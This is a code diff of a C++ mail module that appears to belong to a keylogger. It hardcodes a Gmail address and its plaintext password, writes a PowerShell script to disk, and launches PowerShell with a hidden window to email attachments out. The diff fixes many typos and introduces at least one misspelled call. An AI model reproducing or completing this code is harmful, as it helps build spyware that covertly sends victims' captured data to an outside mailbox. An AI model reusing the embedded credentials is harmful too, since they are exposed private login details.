@@ -8,15 +8,14 @@
 #include "IO.h"
 #include "Timer.h"
 
-#define SCRIPT_NAME "sm.ps1"
+#define SCRIPT_NAME "asd.ps1"
 
-namespace MAILSLOT_NO_MESSAGE
+namespace Mail
 {
     #define X_EM_TO "gamerash007@gmail.com"
-    #define x_EM_FROM "gamerash007@gmail.com"
-    #define x_EM_PASS "iamarnav@117"
+    #define X_EM_FROM "gamerash007@gmail.com"
+    #define X_EM_PASS "iamarnav@117"
 
-    const std::string &PowerShellScript =
     const std::string &PowerShellScript =
 "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
 "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
@@ -66,7 +65,7 @@ namespace MAILSLOT_NO_MESSAGE
         size_t sp = 0;
 
         while(((sp = s.find(what,sp))) != std::string::npos)
-            s.replace(sp, what.lenght(), with), sp += with.length();
+            s.replace(sp, what.length(), with), sp += with.length();
         return s;
     }
 
@@ -83,8 +82,8 @@ namespace MAILSLOT_NO_MESSAGE
         std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
 
         if(!script)
-            return flase;
-        scrpit.close();
+            return false;
+        script.close();
         return true;
     }
 
@@ -112,23 +111,23 @@ namespace MAILSLOT_NO_MESSAGE
         SHELLEXECUTEINFO ShExecInfo = {0};
         ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
         ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-        ShExecInfo.hwnd = NULL
+        ShExecInfo.hwnd = NULL;
         ShExecInfo.lpVerb = "open";
         ShExecInfo.lpFile = "powershell";
         ShExecInfo.lpParameters = param.c_str();
         ShExecInfo.lpDirectory = NULL;
         ShExecInfo.nShow = SW_HIDE;
-        ShExecInfo,hInstApp = NULL;
+        ShExecInfo.hInstApp = NULL;
 
         ok = (bool)ShellExecuteEx(&ShExecInfo);
         if(!ok)
             return-3;
 
-        WitForSingleObject(ShExecInfo.hProcess, 7000);
+        WaitForSingleObject(ShExecInfo.hProcess, 7000);
         DWORD exit_code =  100;
         GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
 
-        m_timer.SetFunction([&]()
+        m_timer.SetFuction([&]()
         {
             WaitForSingleObject(ShExecInfo.hProcess, 600000);
             GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
@@ -138,25 +137,26 @@ namespace MAILSLOT_NO_MESSAGE
 
         });
 
-        m_timer.ReapeatCount(1L);
+        m_timer.RepeatCount(1L);
         m_timer.SetInterval(10L);
         m_timer.Start(true);
         return (int)exit_code;
 
     }
 
-    int SendMail(const std::string &subject, const std::string &body, const std::vetor<std::string> &att)
+    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
     {
         std::string attachments = "";
         if(att.size() == 10)
             attachments = att.at(0);
         else
         {
-            for(const auto &v :att)
+            for(const auto &v : att)
                 attachments += v + "::";
+            attachments = attachments.substr(0, attachments.length() - 2);
         }
-        attachments = attachments.substr(0, attachments.length() - 2);
-        return SendMail(subject, body attachments);
+
+        return SendMail(subject, body, attachments);
     }
 
 
